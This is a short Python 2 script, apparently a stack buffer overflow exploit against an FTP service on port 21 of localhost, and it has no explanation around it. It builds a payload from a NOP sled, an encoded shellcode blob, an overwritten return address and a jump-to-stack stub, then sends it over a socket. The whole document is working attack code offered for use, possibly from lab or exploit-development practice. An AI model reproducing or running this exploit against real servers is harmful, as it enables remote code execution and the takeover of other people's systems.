import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))


shellcode=("\xbf\x9f\x6d\xb4\x7d\xda\xcb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x31\x31\x7a\x13\x03\x7a\x13\x83\xea\x63\x8f\x41\x81\x73\xd2"
"\xaa\x7a\x83\xb3\x23\x9f\xb2\xf3\x50\xeb\xe4\xc3\x13\xb9\x08"
"\xaf\x76\x2a\x9b\xdd\x5e\x5d\x2c\x6b\xb9\x50\xad\xc0\xf9\xf3"
"\x2d\x1b\x2e\xd4\x0c\xd4\x23\x15\x49\x09\xc9\x47\x02\x45\x7c"
"\x78\x27\x13\xbd\xf3\x7b\xb5\xc5\xe0\xcb\xb4\xe4\xb6\x40\xef"
"\x26\x38\x85\x9b\x6e\x22\xca\xa6\x39\xd9\x38\x5c\xb8\x0b\x71"
"\x9d\x17\x72\xbe\x6c\x69\xb2\x78\x8f\x1c\xca\x7b\x32\x27\x09"
"\x06\xe8\xa2\x8a\xa0\x7b\x14\x77\x51\xaf\xc3\xfc\x5d\x04\x87"
"\x5b\x41\x9b\x44\xd0\x7d\x10\x6b\x37\xf4\x62\x48\x93\x5d\x30"
"\xf1\x82\x3b\x97\x0e\xd4\xe4\x48\xab\x9e\x08\x9c\xc6\xfc\x46"
"\x63\x54\x7b\x24\x63\x66\x84\x18\x0c\x57\x0f\xf7\x4b\x68\xda"
"\xbc\xa4\x22\x47\x94\x2c\xeb\x1d\xa5\x30\x0c\xc8\xe9\x4c\x8f"
"\xf9\x91\xaa\x8f\x8b\x94\xf7\x17\x67\xe4\x68\xf2\x87\x5b\x88"
"\xd7\xeb\x3a\x1a\xbb\xc5\xd9\x9a\x5e\x1a")

numberof=2011-len(shellcode)
jumptoshellcode="\x83\xec\x5e\x83\xec\x5e\x83\xec\x5e\x83\xec\x5e\xff\xe4\x90\x90"
exploit= numberof * '\x90' + shellcode + "\xd9\x2f\xe3\x74" + "\x90"*8 + jumptoshellcode



s.send(exploit)
print s.recv(1024)
s.close()

